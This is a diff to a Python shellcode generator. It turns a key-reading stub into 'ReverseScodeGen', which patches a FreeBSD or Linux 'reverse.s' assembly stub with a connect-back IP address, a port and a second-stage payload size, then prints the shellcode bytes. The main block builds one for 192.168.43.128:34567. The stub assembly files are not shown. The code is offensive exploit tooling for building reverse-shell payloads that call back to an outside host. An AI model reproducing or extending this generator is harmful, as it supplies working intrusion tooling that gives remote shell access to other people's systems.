@@ -4,14 +4,12 @@ import os
 import sys
 import tempfile
 
-class ReadScodeGen():
-    def __init__(self, keyFilename, keySize, ipAddrStr, portNum, xorKey = 0x99, platform = "freebsd", encodeFlag = False ):
-        self.keyFilename = keyFilename
-        self.keySize = keySize
-        self.xorKey = xorKey
+class ReverseScodeGen():
+    def __init__(self, ipAddrStr, portNum, secondStageSize, platform = "freebsd", encodeFlag = False ):
         self.encodeFlag = encodeFlag
         self.ipAddrStr = ipAddrStr
         self.portNum = portNum
+        self.secondStageSize = secondStageSize
 
         if platform == "freebsd":
             self.stubDir = "./stub/freebsd"
@@ -63,18 +61,15 @@ class ReadScodeGen():
     def __prepareStub(self):
         sys.stdout.write("[*] __prepareStub()\n")
         # prepare stub
-        fstr = open("%s/read.s" % self.stubDir).read()
-        fstr = fstr.replace("FILENAME", self.keyFilename)
-        fstr = fstr.replace("0xaa", "0x%02x" % self.keySize)
-        fstr = fstr.replace("0x99", "0x%02x" % self.xorKey)        
-
+        fstr = open("%s/reverse.s" % self.stubDir).read()
         
         fstr = fstr.replace("0xbfbf", "0x%04x" % self.convertPortNum(self.portNum))
         self.ipAddr = self.convertIpAddrStr(self.ipAddrStr)
         fstr = fstr.replace("0x0100007f", "0x%08x" % self.ipAddr)
+        fstr = fstr.replace("0xaa", "0x%02x" % self.secondStageSize)        
         
         sys.stdout.write("[*] IP Addr : [%s] [0x%08x]\n" % ( self.ipAddrStr, self.ipAddr))
-        sys.stdout.write("[*] Port : [0x%04x] [%d]\n" % (self.portNum, self.portNum))
+        sys.stdout.write("[*] Port : [0x%04x]\n" % self.portNum)
         
         open(self.asmFilename, "w").write(fstr)
 
@@ -111,7 +106,6 @@ class ReadScodeGen():
 
         testStr = "./testScode ../../tmp/%s" % self.binFilename[self.binFilename.rfind("/"):]
         sys.stdout.write(testStr + "\n")        
-        
         return scodeBinStr
 
     def getBinScode(self):
@@ -154,11 +148,9 @@ class ReadScodeGen():
         return 
 
 if __name__ == "__main__":
-    #gen = ReadScodeGen( "/tmp/key", 0x10, "127.0.0.1", 23456, platform="linux")
-    #gen = ReadScodeGen( "/tmp/key", 0x30, "141.223.83.189", 23456, platform="freebsd")
-    gen = ReadScodeGen( "/tmp/key", 0x4, "192.168.43.128", 23456, xorKey=0x88, platform="freebsd")
+    gen = ReverseScodeGen( "192.168.43.128", 34567, 0xff, platform="freebsd")
 
     #gen.encode()
     gen.getBinScode()
-    print gen.getPythonFormatScode()
+    #print gen.getPythonFormatScode()
     #print gen.getCppFormatScode()    
